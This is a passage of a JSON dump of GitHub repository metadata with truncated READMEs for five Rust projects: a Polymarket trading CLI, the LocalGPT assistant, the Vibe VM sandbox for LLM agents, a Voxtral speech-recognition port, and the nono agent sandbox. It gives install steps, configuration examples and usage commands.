      "readme": "# Polymarket CLI\n\nRust CLI for Polymarket. Browse markets, place orders, manage positions, and interact with onchain contracts ‚Äî from a terminal or as a JSON API for scripts and agents.\n\n> **Warning:** This is early, experimental software. Use at your own risk and do not use with large amounts of funds. APIs, commands, and behavior may change without notice. Always verify transactions before confirming.\n\n## Install\n\n### Homebrew (macOS / Linux)\n\n```bash\nbrew tap Polymarket/polymarket-cli https://github.com/Polymarket/polymarket-cli\nbrew install polymarket\n```\n\n### Shell script\n\n```bash\ncurl -sSL https://raw.githubusercontent.com/Polymarket/polymarket-cli/main/install.sh | sh\n```\n\n### Build from source\n\n```bash\ngit clone https://github.com/Polymarket/polymarket-cli\ncd polymarket-cli\ncargo install --path .\n```\n\n## Quick Start\n\n```bash\n# No wallet needed ‚Äî browse markets immediately\npolymarket markets list --limit 5\npolymarket markets search \"election\"\npolymarket events list --tag politics\n\n# Check a specific market\npolymarket markets get will-trump-win-the-2024-election\n\n# JSON output for scripts\npolymarket -o json markets list --limit 3\n```\n\nTo trade, set up a wallet:\n\n```bash\npolymarket setup\n# Or manually:\npolymarket wallet create\npolymarket approve set\n```\n\n## Configuration\n\n### Wallet Setup\n\nThe CLI needs a private key to sign orders and on-chain transactions. Three ways to provide it (checked in this order):\n\n1. **CLI flag**: `--private-key 0xabc...`\n2. **Environment variable**: `POLYMARKET_PRIVATE_KEY=0xabc...`\n3. **Config file**: `~/.config/polymarket/config.json`\n\n```bash\n# Create a new wallet (generates random key, saves to config)\npolymarket wallet create\n\n# Import an existing key\npolymarket wallet import 0xabc123...\n\n# Check what's configured\npolymarket wallet show\n```\n\nThe config file (`~/.config/polymarket/config.json`):\n\n```json\n{\n  \"private_key\": \"0x...\",\n  \"chain_id\": 137,\n  \"signature_type\": \"proxy\"\n}\n```\n\n### Signature Types\n\n- `proxy` (default) ‚Äî uses Polymarket's proxy wallet system\n- `eoa` ‚Äî signs directly with your key\n- `gnosis-safe` ‚Äî for multisig wallets\n\nOverride per-command with `--signature-type eoa` or via `POLYMARKET_SIGNATURE_TYPE`.\n\n### What Needs a Wallet\n\nMost commands work without a wallet ‚Äî browsing markets, viewing order books, checking prices. You only need a wallet for:\n\n- Placing and canceling orders (`clob create-order`, `clob market-order`, `clob cancel-*`)\n- Checking your balances and trades (`clob balance`, `clob trades`, `clob orders`)\n- On-chain operations (`approve set`, `ctf split/merge/redeem`)\n- Reward and API key management (`clob rewards`, `clob create-api-key`)\n\n## Output Formats\n\nEvery command supports `--output table` (default) and `--output json`.\n\n```bash\n# Human-readable table (default)\npolymarket markets list --limit 2\n```\n\n```\n Question                            Price (Yes)  Volume   Liquidity  Status\n Will Trump win the 2024 election?   52.00¬¢       $145.2M  $1.2M      Active\n Will BTC hit $100k by Dec 2024?     67.30¬¢       $89.4M   $430.5K    Active\n```\n\n```bash\n# Machine-readable JSON\npolymarket -o json markets list --limit 2\n```\n\n```json\n[\n  { \"id\": \"12345\", \"question\": \"Will Trump win the 2024 election?\", \"outcomePrices\": [\"0.52\", \"0.48\"], ... },\n  { \"id\": \"67890\", \"question\": \"Will BTC hit $100k by Dec 2024?\", ... }\n]\n```\n\nShort form: `-o json` or `-o table`.\n\nErrors follow the same pattern ‚Äî table mode prints `Error: ...` to stderr, JSON mode prints `{\"error\": \"...\"}` to stdout. Non-zero exit code either way.\n\n## Commands\n\n### Markets\n\n```bash\n# List markets with filters\npolymarket markets list --limit 10\npolymarket markets list --active true --order volume_num\npolymarket markets list --closed false --limit 50 --offset 25\n\n# Get a single market by ID or slug\npolymarket markets get 12345\npolymarket markets get will-trump-win\n\n# Search\npolymarket markets search \"bitcoin\" --limit 5\n\n# Get tags for a market\npolymarket markets tags 12345\n```\n\n**Flags for `markets list`**: `--limit`, `--offset`, `--order`, `--ascending`, `--active`, `--closed`\n\n### Events\n\nEvents group related markets (e.g. \"2024 Election\" contains multiple yes/no markets).\n\n```bash\npolymarket events list --limit 10\npolymarket events list --tag politics --active true\npolymarket events get 500\npolymarket events tags 500\n```\n\n**Flags for `events list`**: `--limit`, `--offset`, `--order`, `--ascending`, `--active`, `--closed`, `--tag`\n\n### Tags, Series, Comments, Profiles, Sports\n\n```bash\n# Tags\npolymarket tags list\npolymarket tags get politics\npolymarket tags related politics\npolymarket tags related-tags politics\n\n# Series (recurring events)\npolymarket series list --limit 10\npolymarket series get 42\n\n# Comments on an entity\npolymarket comments list --entity-type event --entity-id 500\npolymarket comments get abc123\npolymarket comments by-user 0xf5E6...\n\n# Public profiles\npolymarket profiles get 0xf5E6...\n\n# Sports metadata\npolymarket sports list\npolymarket sports market-types\npolyma",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:58.809948"
  },
  {
    "basic_info": {
      "name": "localgpt",
      "full_name": "localgpt-app/localgpt",
      "owner": "localgpt-app",
      "description": "Local AI assistant, dreaming explorable worlds.",
      "url": "https://github.com/localgpt-app/localgpt",
      "clone_url": "https://github.com/localgpt-app/localgpt.git",
      "ssh_url": "git@github.com:localgpt-app/localgpt.git",
      "homepage": "https://localgpt.app/",
      "created_at": "2026-02-01T17:32:52Z",
      "updated_at": "2026-02-27T02:46:52Z",
      "pushed_at": "2026-02-27T02:46:49Z"
    },
    "stats": {
      "stars": 1006,
      "forks": 73,
      "watchers": 1006,
      "open_issues": 10,
      "size": 4472
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1466808,
        "C": 95822,
        "Swift": 55001,
        "JavaScript": 24879,
        "CSS": 17126,
        "Kotlin": 14939,
        "TypeScript": 14271,
        "HTML": 4193,
        "Shell": 3874,
        "Dockerfile": 1157
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "ai",
        "bevy",
        "rust",
        "world"
      ]
    },
    "content": {
      "readme": "\n# <img src=\"https://localgpt.app/logo/localgpt-icon-app.svg\" width=\"50\" height=\"50\" alt=\"LocalGPT\" /> LocalGPT\n\n[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://github.com/localgpt-app/localgpt#license)\n[![Crates.io](https://img.shields.io/crates/v/localgpt.svg)](https://crates.io/crates/localgpt)\n[![Downloads](https://img.shields.io/crates/d/localgpt.svg)](https://crates.io/crates/localgpt)\n[![Docs](https://docs.rs/localgpt/badge.svg)](https://docs.rs/localgpt/latest/localgpt)\n[![CI](https://github.com/localgpt-app/localgpt/workflows/CI/badge.svg)](https://github.com/localgpt-app/localgpt/actions)\n[![Discord](https://img.shields.io/discord/691052431525675048.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/yMQ8tfxG)\n\nA local device focused AI assistant built in Rust ‚Äî persistent memory, autonomous tasks. Inspired by and compatible with OpenClaw.\n\n`cargo install localgpt`\n\n## Why LocalGPT?\n\n- **Single binary** ‚Äî no Node.js, Docker, or Python required\n- **Local device focused** ‚Äî runs entirely on your machine, your memory data stays yours\n- **Persistent memory** ‚Äî markdown-based knowledge store with full-text and semantic search\n- **Hybrid web search** ‚Äî native provider search passthrough plus client-side fallback providers\n- **Autonomous heartbeat** ‚Äî delegate tasks and let it work in the background\n- **Multiple interfaces** ‚Äî CLI, web UI, desktop GUI, Telegram bot\n- **Defense-in-depth security** ‚Äî signed policy files, kernel-enforced sandbox, prompt injection defenses\n- **Multiple LLM providers** ‚Äî Anthropic (Claude), OpenAI, xAI (Grok), Ollama, GLM (Z.AI), OAuth subscriptions (Claude Pro/Max, Gemini)\n- **OpenClaw compatible** ‚Äî works with SOUL, MEMORY, HEARTBEAT markdown files and skills format\n\n## Install\n\n```bash\n# From crates.io (includes desktop GUI)\ncargo install localgpt\n\n# Headless (no desktop GUI ‚Äî for servers, Docker, CI)\ncargo install localgpt --no-default-features\n\n# From source checkout\ncargo install --path crates/cli\n```\n\n## Quick Start\n\n```bash\n# Initialize configuration\nlocalgpt config init\n\n# Start interactive chat\nlocalgpt chat\n\n# Ask a single question\nlocalgpt ask \"What is the meaning of life?\"\n\n# Inspect resolved config/data/state/cache paths\nlocalgpt paths\n\n# Run as a daemon with heartbeat, HTTP API and web ui\nlocalgpt daemon start\n```\n\n## How It Works\n\nLocalGPT uses XDG-compliant directories (or platform equivalents) for config/data/state/cache. Run `localgpt paths` to see your resolved paths.\n\nWorkspace memory layout:\n\n```\n<data_dir>/workspace/\n‚îú‚îÄ‚îÄ MEMORY.md            # Long-term knowledge (auto-loaded each session)\n‚îú‚îÄ‚îÄ HEARTBEAT.md         # Autonomous task queue\n‚îú‚îÄ‚îÄ SOUL.md              # Personality and behavioral guidance\n‚îî‚îÄ‚îÄ knowledge/           # Structured knowledge bank (optional)\n    ‚îú‚îÄ‚îÄ finance/\n    ‚îú‚îÄ‚îÄ legal/\n    ‚îî‚îÄ‚îÄ tech/\n```\n\nFiles are indexed with SQLite FTS5 for fast keyword search, and sqlite-vec for semantic search with local embeddings.\n\n## Configuration\n\nStored at `<config_dir>/config.toml` (run `localgpt config path` or `localgpt paths`):\n\n```toml\n[agent]\ndefault_model = \"claude-cli/opus\"\n\n[providers.anthropic]\napi_key = \"${ANTHROPIC_API_KEY}\"\n\n[heartbeat]\nenabled = true\ninterval = \"30m\"\nactive_hours = { start = \"09:00\", end = \"22:00\" }\n\n[memory]\nworkspace = \"~/.local/share/localgpt/workspace\" # optional override\n\n# Optional: Telegram bot\n[telegram]\nenabled = true\napi_token = \"${TELEGRAM_BOT_TOKEN}\"\n```\n\n### Using a local OpenAI-compatible server (LM Studio, llamafile, etc.)\n\nIf you run a local server that speaks the OpenAI API (e.g., LM Studio, llamafile, vLLM), point LocalGPT at it and pick an `openai/*` model ID so it does **not** try to spawn the `claude` CLI:\n\n1. Start your server (LM Studio default port: `1234`; llamafile default: `8080`) and note its model name.\n2. Edit your config file (`localgpt config path`):\n   ```toml\n   [agent]\n   default_model = \"openai/<your-model-name>\"\n\n   [providers.openai]\n   # Many local servers accept a dummy key\n   api_key = \"not-needed\"\n   base_url = \"http://127.0.0.1:8080/v1\" # or http://127.0.0.1:1234/v1 for LM Studio\n   ```\n3. Run `localgpt chat` (or `localgpt daemon start`) and requests will go to your local server.\n\nTip: If you see `Failed to spawn Claude CLI`, change `agent.default_model` away from `claude-cli/*` or install the `claude` CLI.\n\n### Web Search\n\nConfigure web search providers under `[tools.web_search]` and validate with:\n\n```bash\nlocalgpt search test \"rust async runtime\"\nlocalgpt search stats\n```\n\nFull setup guide: [`docs/web-search.md`](docs/web-search.md)\n\n### OAuth Subscription Plans\n\nUse Claude Pro/Max or Google Gemini subscription credentials via OAuth instead of pay-per-request API keys:\n\n```toml\n# Claude Pro/Max OAuth (preferred over api_key when configured)\n[providers.anthropic_oauth]\naccess_token = \"${ANTHROPIC_OAUTH_TOKEN}\"\nrefresh_token = \"${ANTHROPIC_OAUTH_REFRESH_TOKEN}\"\n\n# Google Gemini subscription OAuth\n[providers",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:59.937944"
  },
  {
    "basic_info": {
      "name": "vibe",
      "full_name": "lynaghk/vibe",
      "owner": "lynaghk",
      "description": "Easy Linux virtual machine on MacOS to sandbox LLM agents.",
      "url": "https://github.com/lynaghk/vibe",
      "clone_url": "https://github.com/lynaghk/vibe.git",
      "ssh_url": "git@github.com:lynaghk/vibe.git",
      "homepage": null,
      "created_at": "2026-01-28T13:04:55Z",
      "updated_at": "2026-02-26T16:21:00Z",
      "pushed_at": "2026-02-22T20:24:36Z"
    },
    "stats": {
      "stars": 777,
      "forks": 33,
      "watchers": 777,
      "open_issues": 2,
      "size": 130
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 45243,
        "Shell": 1935
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "Vibe is a quick, zero-configuration way to spin up a Linux virtual machine on Mac to sandbox LLM agents:\n\n```\n$ cd my-project\n$ vibe\n\n‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñì‚ñà‚ñì‚ñí‚ñë ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë\n   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñì‚ñí‚ñë  ‚ñë‚ñí‚ñì‚ñà‚ñì‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë\n\nHost                                      Guest                    Mode\n----------------------------------------  -----------------------  ----------\n/Users/dev/work/my-project                /root/my-project         read-write\n/Users/dev/.cache/vibe/.guest-mise-cache  /root/.local/share/mise  read-write\n/Users/dev/.m2                            /root/.m2                read-write\n/Users/dev/.cargo/registry                /root/.cargo/registry    read-write\n/Users/dev/.codex                         /root/.codex             read-write\n/Users/dev/.claude                        /root/.claude            read-write\n/Users/dev/.gemini                        /root/.gemini            read-write\n\nroot@vibe:~/my-project#\n```\n\nOn my M1 MacBook Air it takes ~10 seconds to boot.\n\n\nDependencies:\n\n- An ARM-based Mac running MacOS 13 (Ventura) or higher.\n- A network connection is required on the first run to download and configure the Debian Linux base image.\n- That's it!\n\n\n## Why use Vibe?\n\n- LLM agents are more fun to use with `--yolo`, since they're not always interrupting you to approve their commands.\n- Sandboxing the agent in a VM lets it install/remove whatever tools its lil' transformer heart desires, *without* wrecking your actual machine.\n- You control what the agent (and thus the upstream LLM provider) can actually see, by controlling exactly what's shared into the VM sandbox.\n  (This project was inspired by me running `codex` *without* `--yolo` and seeing it reading files outside of the directory I started it in --- not cool, bro.)\n\nI'm using virtual machines rather than containers because:\n\n- Virtualization is more secure against malicious escapes than containers or the MacOS sandbox framework.\n- Containers on MacOS require spinning up a virtual machine anyway.\n\nFinally, as a matter of taste and style:\n\n- The binary is < 1 MB.\n- I wrote the entire README myself, 100% with my human brain.\n- The entire implementation is in one ~1200 line Rust file.\n- The only Rust dependencies are the [Objc2](https://github.com/madsmtm/objc2) interop crates and the [lexopt](https://github.com/blyxxyz/lexopt) argument parser.\n- There are no emoji anywhere in this repository.\n\n\n## Install\n\nVibe is a single binary built with Rust.\n\nDownload [the latest binary built by GitHub actions](https://github.com/lynaghk/vibe/releases/tag/latest) and put it somewhere on your `$PATH`:\n\n    curl -LO https://github.com/lynaghk/vibe/releases/download/latest/vibe-macos-arm64.zip\n    unzip vibe-macos-arm64.zip\n    mkdir -p ~/.local/bin\n    mv vibe ~/.local/bin\n    export PATH=\"$HOME/.local/bin:$PATH\"\n\nIf you use [mise-en-place](https://mise.jdx.dev/):\n\n    mise use github:lynaghk/vibe@latest\n\nI'm not making formal releases or keeping a change log.\nI recommend reading the commit history and pinning to a specific version.\n\nYou can also install via `cargo`:\n\n    cargo install --locked --git https://github.com/lynaghk/vibe.git\n\nIf you don't have `cargo`, you need to install Rust:\n\n    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n\n\n## Using Vibe\n\n\n```\nvibe [OPTIONS] [disk-image.raw]\n\nOptions\n\n  --help                                                    Print this help message.\n  --version                                                 Print the version (commit SHA and build date).\n  --no-default-mounts                                       Disable all default mounts, including .git and .vibe project subfolder masking.\n  --mount host-path:guest-path[:read-only | :read-write]    Mount `host-path` inside VM at `guest-path`.\n                                                            Defaults to read-write.\n                                                            Errors if host-path does not exist.\n  --cpus <count>                                            Number of virtual CPUs (default 2).\n  --ram <megabytes>                                         RAM size in megabytes (default 2048).\n  --script <path/to/script.sh>                              Run script in VM.\n  --send <some-command>                                     Type `some-command` followed by newline into the VM.\n  --expect <string> [timeout-seconds]                       Wait for `string` to appear in console output before executing next `--script` or `--send`.\n                                                            If `string` does not appear within timeout (default 30 seconds), shutdown VM with error.\n```\n\nInvoking vibe without a disk image:\n\n- shares the current directory with the VM\n- shares package manager cache directories with the VM, s",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:01.077186"
  },
  {
    "basic_info": {
      "name": "voxtral-mini-realtime-rs",
      "full_name": "TrevorS/voxtral-mini-realtime-rs",
      "owner": "TrevorS",
      "description": "Streaming speech recognition running natively and in the browser. A pure Rust implementation of Mistral's Voxtral Mini 4B Realtime model using the Burn ML framework.",
      "url": "https://github.com/TrevorS/voxtral-mini-realtime-rs",
      "clone_url": "https://github.com/TrevorS/voxtral-mini-realtime-rs.git",
      "ssh_url": "git@github.com:TrevorS/voxtral-mini-realtime-rs.git",
      "homepage": "https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime",
      "created_at": "2026-02-04T23:22:00Z",
      "updated_at": "2026-02-26T13:55:53Z",
      "pushed_at": "2026-02-12T00:59:08Z"
    },
    "stats": {
      "stars": 668,
      "forks": 27,
      "watchers": 668,
      "open_issues": 2,
      "size": 3551
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 714631,
        "Python": 162436,
        "JavaScript": 82037,
        "HTML": 37508,
        "WGSL": 8866,
        "TypeScript": 8681,
        "Makefile": 1990,
        "Shell": 1167
      },
      "license": "Apache License 2.0",
      "topics": [
        "asr",
        "burn",
        "mistral",
        "rust",
        "voxtral-mini-realtime",
        "wasm"
      ]
    },
    "content": {
      "readme": "# Voxtral Mini 4B Realtime (Rust)\n\n[![HuggingFace](https://img.shields.io/badge/%F0%9F%A4%97-Model_on_HuggingFace-yellow)](https://huggingface.co/TrevorJS/voxtral-mini-realtime-gguf)\n[![Live Demo](https://img.shields.io/badge/%F0%9F%94%8A-Live_Demo-blue)](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime)\n\nStreaming speech recognition running natively and in the browser. A pure Rust implementation of [Mistral's Voxtral Mini 4B Realtime](https://huggingface.co/mistralai/Voxtral-Mini-4B-Realtime-2602) model using the [Burn](https://burn.dev) ML framework.\n\n## Benchmarks\n\nNVIDIA DGX Spark (GB10, LPDDR5x), 16s test audio, 3-run average:\n\n| Path | Encode | Decode | Total | RTF | Tok/s | Memory |\n|------|--------|--------|-------|-----|-------|--------|\n| **Q4 GGUF native** | 1021 ms | 5578 ms | 6629 ms | **0.416** | **19.4** | 703 MB |\n| F32 native | 887 ms | 23689 ms | 24607 ms | 1.543 | 4.6 | 9.2 GB |\n| Q4 GGUF WASM | ‚Äî | ‚Äî | ~225 s | ~14.1 | ~0.5 | (browser) |\n\n- **RTF** (Real-Time Factor): 0.416 means transcription completes in under half the audio duration\n- Q4 decode is **4.2√ó faster** than F32 ‚Äî fused dequant+matmul avoids materializing 9 GB of weights\n- Custom WGSL compute shaders with vectorized u32 reads and vec4 dot products\n- Dual-path kernel dispatch: shared-memory tiled kernel for single-token decode, naive kernel for multi-row encode/prefill\n- **8.49% WER** on FLEURS English (647 utterances), vs. Mistral's reported 4.90% at f32\n\nThe Q4 GGUF quantized path (2.5 GB) runs entirely client-side in a browser tab via WASM + WebGPU. [Try it live.](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime)\n\n## Quick Start\n\n### Native CLI\n\n```bash\n# Download model weights (~9 GB)\nuv run --with huggingface_hub \\\n  hf download mistralai/Voxtral-Mini-4B-Realtime-2602 --local-dir models/voxtral\n\n# Transcribe an audio file (f32 SafeTensors path)\ncargo run --release --features \"wgpu,cli,hub\" --bin voxtral-transcribe -- \\\n  --audio audio.wav --model models/voxtral\n\n# Or use the Q4 quantized path (~2.5 GB)\ncargo run --release --features \"wgpu,cli,hub\" --bin voxtral-transcribe -- \\\n  --audio audio.wav --gguf models/voxtral-q4.gguf --tokenizer models/voxtral/tekken.json\n```\n\n### Browser Demo\n\n```bash\n# Build WASM package\nwasm-pack build --target web --no-default-features --features wasm\n\n# Generate self-signed cert (WebGPU requires secure context)\nopenssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \\\n  -keyout /tmp/voxtral-key.pem -out /tmp/voxtral-cert.pem \\\n  -days 7 -nodes -subj \"/CN=localhost\"\n\n# Start dev server\nbun serve.mjs\n```\n\nOpen `https://localhost:8443`, accept the certificate, and click **Load from Server** to download the model shards. Record from your microphone or upload a WAV file to transcribe.\n\n[Hosted demo on HuggingFace Spaces](https://huggingface.co/spaces/TrevorJS/voxtral-mini-realtime) if you want to skip local setup.\n\n## Architecture\n\n```\nAudio (16kHz mono)\n  -> Mel spectrogram [B, 128, T]\n    -> Causal encoder (32 layers, 1280 dim, sliding window 750)\n      -> Conv 4x downsample -> Reshape [B, T/16, 5120]\n        -> Adapter [B, T/16, 3072]\n          -> Autoregressive decoder (26 layers, 3072 dim, GQA 32Q/8KV)\n            -> Token IDs -> Text\n```\n\n### Two Inference Paths\n\n| | F32 (native) | Q4 GGUF (native + browser) |\n|---|---|---|\n| Weights | SafeTensors (~9 GB) | GGUF Q4_0 (~2.5 GB) |\n| Linear ops | Burn tensor matmul | Custom WGSL shader (fused dequant + matmul) |\n| Embeddings | f32 tensor (1.5 GiB) | Q4 on GPU (216 MB) + CPU bytes for lookups |\n| Browser | No | Yes (WASM + WebGPU) |\n\n### Q4 Padding Workaround\n\nThe upstream mistral-common library left-pads audio with 32 silence tokens (at 12.5 Hz). After the mel/conv/reshape pipeline, this covers only 16 of the 38 decoder prefix positions with silence ‚Äî the remaining 22 contain actual audio. The f32 model handles this fine, but Q4_0 quantization makes the decoder sensitive to speech content in the prefix: audio that starts immediately with speech (mic recordings, clips with no leading silence) produces all-pad tokens instead of text.\n\nThe left padding is increased to 76 tokens, which maps to exactly 38 decoder tokens of silence and covers the full streaming prefix. See [`src/audio/pad.rs`](src/audio/pad.rs) for details.\n\n### WASM Constraints Solved\n\nRunning a 4B model in a browser tab required solving five hard constraints:\n\n1. **2 GB allocation limit** ‚Äî `ShardedCursor` reads across multiple `Vec<u8>` buffers\n2. **4 GB address space** ‚Äî Two-phase loading: parse weights, drop reader, then finalize\n3. **1.5 GiB embedding table** ‚Äî Q4 embeddings on GPU + CPU-side row lookups\n4. **No sync GPU readback** ‚Äî All tensor reads use `into_data_async().await`\n5. **256 workgroup invocation limit** ‚Äî Patched cubecl-wgpu to cap reduce kernel workgroups\n\n## Building\n\n```bash\n# Native (default features: wgpu + native-tokenizer)\ncargo build --release\n\n# With all features\ncargo build --release --features \"wgpu,cli,hub\"\n\n# WASM\n",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:26:02.205423"
  },
  {
    "basic_info": {
      "name": "nono",
      "full_name": "always-further/nono",
      "owner": "always-further",
      "description": "Secure, kernel-enforced sandbox CLI and SDKs for AI agents. Capability-based isolation with secure key management, atomic rollback, cryptographic immutable audit chain of provenance. Run your agents in a zero-trust environment.",
      "url": "https://github.com/always-further/nono",
      "clone_url": "https://github.com/always-further/nono.git",
      "ssh_url": "git@github.com:always-further/nono.git",
      "homepage": "https://nono.sh/docs",
      "created_at": "2026-01-31T09:25:45Z",
      "updated_at": "2026-02-27T02:40:47Z",
      "pushed_at": "2026-02-26T13:53:28Z"
    },
    "stats": {
      "stars": 620,
      "forks": 45,
      "watchers": 620,
      "open_issues": 35,
      "size": 18984
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1375756,
        "Shell": 82781,
        "C": 18597,
        "Makefile": 2944
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "agentic-ai",
        "ai-agent-security",
        "ai-agents",
        "ai-security",
        "code-execution",
        "cybersecurity",
        "isolation",
        "linux-security",
        "llm",
        "mcp",
        "open-source",
        "prompt-injection",
        "runtime-security",
        "sandbox",
        "security",
        "sigstore",
        "supply-chain-security",
        "zero-trust"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<img src=\"assets/nono-logo.png\" alt=\"nono logo\" width=\"600\"/>\n\n**AI agent security that makes the dangerous bits structurally impossible.**\n\n<p>\n  From the creator of\n  <a href=\"https://sigstore.dev\"><strong>Sigstore</strong></a>\n  <br/>\n  <sub>The standard for secure software attestation, used by PyPI, npm, brew, and Maven Central</sub>\n</p>\n<p>\n  <a href=\"https://opensource.org/licenses/Apache-2.0\"><img src=\"https://img.shields.io/badge/License-Apache%202.0-blue.svg\" alt=\"License\"/></a>\n  <a href=\"https://github.com/always-further/nono/actions/workflows/ci.yml\"><img src=\"https://github.com/always-further/nono/actions/workflows/ci.yml/badge.svg\" alt=\"CI Status\"/></a>\n  <a href=\"https://docs.nono.sh\"><img src=\"https://img.shields.io/badge/Docs-docs.nono.sh-green.svg\" alt=\"Documentation\"/></a>\n</p>\n<p>\n  <a href=\"https://discord.gg/pPcjYzGvbS\">\n    <img src=\"https://img.shields.io/badge/Chat-Join%20Discord-7289da?style=for-the-badge&logo=discord&logoColor=white\" alt=\"Join Discord\"/>\n  </a>\n</p>\n\n</div>\n\n> [!WARNING]\n> This is an early alpha release that has not undergone comprehensive security audits. While we have taken care to implement robust security measures, there may still be undiscovered issues. We do not recommend using this in production until we release a stable version of 1.0.\n\n> [!NOTE]\n> We are just wrapping up the separation of the CLI and core library. The last stable CLI release is still available on homebrew tap (version v0.5.0) and is fine to use. We will update this README with installation instructions when all library clients are ready. We plan to submit to homebrew-core, but the repo is not yet 30 days old.\n\nAI agents get filesystem access, run shell commands, and are inherently open to prompt injection. The standard response is guardrails and policies. The problem is that policies can be bypassed and guardrails linguistically overcome.\n\nKernel-enforced sandboxing (Landlock/Seatbelt) blocks unauthorized access at the syscall level. Every filesystem change gets a rollback snapshot with integrity protection. Destructive commands are denied before they run. Secrets are injected without touching disk. When the agent needs access outside its permissions, a kernel-mediated supervisor intercepts the syscall via seccomp BPF, opens the file after user approval, and injects only the file descriptor ‚Äî the agent never executes its own `open()`. No root or `CAP_SYS_ADMIN` required. Runs on any Linux kernel 5.13+ ‚Äî bare metal, containers(Docker,Podman,K8s), Firecracker, Kata.\n\n## CLI\n\nThe CLI builds on the library to provide a ready-to-use sandboxing tool, popular with coding-agents, with built-in profiles, policy groups, and interactive UX.\n\n```bash\n# Claude Code with inbuilt profile\nnono run --profile claude-code -- claude\n# OpenCode with custom permissions\nnono run --profile opencode --allow-cwd/src --allow-cwd/output -- opencode\n# OpenClaw with custom permissions\nnono run --profile openclaw --allow-cwd -- openclaw gateway\n# Any command with custom permissions\nnono run --read ./src --write ./output -- cargo build\n```\n\n## Library (Coming very Soon!)\n\nThe core is a Rust library that can be embedded into any application via native bindings. The library is a policy-free sandbox primitive -- it applies only what clients explicitly request.\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/rust/rust-original.svg\" width=\"18\" height=\"18\" alt=\"Rust\"/> Rust ‚Äî [crates.io](https://crates.io/crates/nono)\n\n```rust\nuse nono::{CapabilitySet, Sandbox};\n\nlet mut caps = CapabilitySet::new();\ncaps.allow_read(\"/data/models\")?;\ncaps.allow_write(\"/tmp/workspace\")?;\n\nSandbox::apply(&caps)?;  // Irreversible ‚Äî kernel-enforced from here on\n```\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg\" width=\"18\" height=\"18\" alt=\"Python\"/> Python ‚Äî [nono-py](https://github.com/always-further/nono-py)\n\n```python\nfrom nono_py import CapabilitySet, AccessMode, apply\n\ncaps = CapabilitySet()\ncaps.allow_path(\"/data/models\", AccessMode.READ)\ncaps.allow_path(\"/tmp/workspace\", AccessMode.READ_WRITE)\n\napply(caps)  # Apply CapabilitySet\n```\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/typescript/typescript-original.svg\" width=\"18\" height=\"18\" alt=\"TypeScript\"/> TypeScript ‚Äî [nono-ts](https://github.com/always-further/nono-ts)\n\n```typescript\nimport { CapabilitySet, AccessMode, apply } from \"nono-ts\";\n\nconst 